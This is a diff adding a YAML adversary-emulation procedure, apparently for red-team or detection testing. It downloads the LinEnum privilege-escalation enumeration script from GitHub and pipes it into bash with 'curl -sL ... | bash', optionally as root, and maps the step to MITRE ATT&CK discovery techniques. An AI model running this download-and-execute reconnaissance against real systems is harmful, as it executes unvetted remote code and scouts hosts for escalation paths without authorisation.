@@ -1,0 +1,56 @@
+---
+name: identify-privilege-escalation-paths-with-linenum
+description: Downloads latest linEnum from Github and executes it with bash
+requirements:
+  platforms:
+    - os: linux
+args:
+  - name: escalate_privileges
+    default: false
+  - name: download_link
+    default: https://raw.githubusercontent.com/rebootuser/LinEnum/65475312171107e9373dd8b06c9757610f0653d8/LinEnum.sh
+mitre:
+  tactics:
+    - TA0003 Execution
+    - TA0007 Discovery
+  techniques:
+    - T1059 Command and Scripting Interpreter
+    - T1087 Account Discovery
+    - T1083 File and Directory Discovery
+    - T1057 Process Discovery
+    - T1069 Permission Groups Discovery
+    - T1518 Software Discovery
+    - T1082 System Information Discovery
+    - T1033 System Owner/User Discovery
+    - T1007 System Service Discovery
+  subtechniques:
+    - T1059.004 Command and Scripting Interpreter Unix Shell
+
+steps:
+  - name: setup
+    inline: |
+      if ! command -v curl &> /dev/null; then
+          echo "Error: curl is not installed on the current system, cannot download LinEnum."
+          exit 1
+      fi
+  - name: ensure-root-user-if-required
+    inline: |
+      echo "{{ .Args.escalate_privileges }}"
+      if [[ {{ .Args.escalate_privileges }} -ne 0 ]]; then
+        if [[ "${EUID}" -ne 0 ]]; then
+            echo "error: TTP must be run as root."
+            exit 1
+        fi
+      else
+        echo "No need to run as root."
+      fi
+  - name: download-and-run-linenum
+    inline: |
+      curl -sL {{ .Args.download_link }} | bash
+      execution_status=$?
+      if [[ "${execution_status}" == 0 ]]; then
+        echo "TTP Ran Successfully"
+        exit 0
+      else
+        exit 1
+      fi
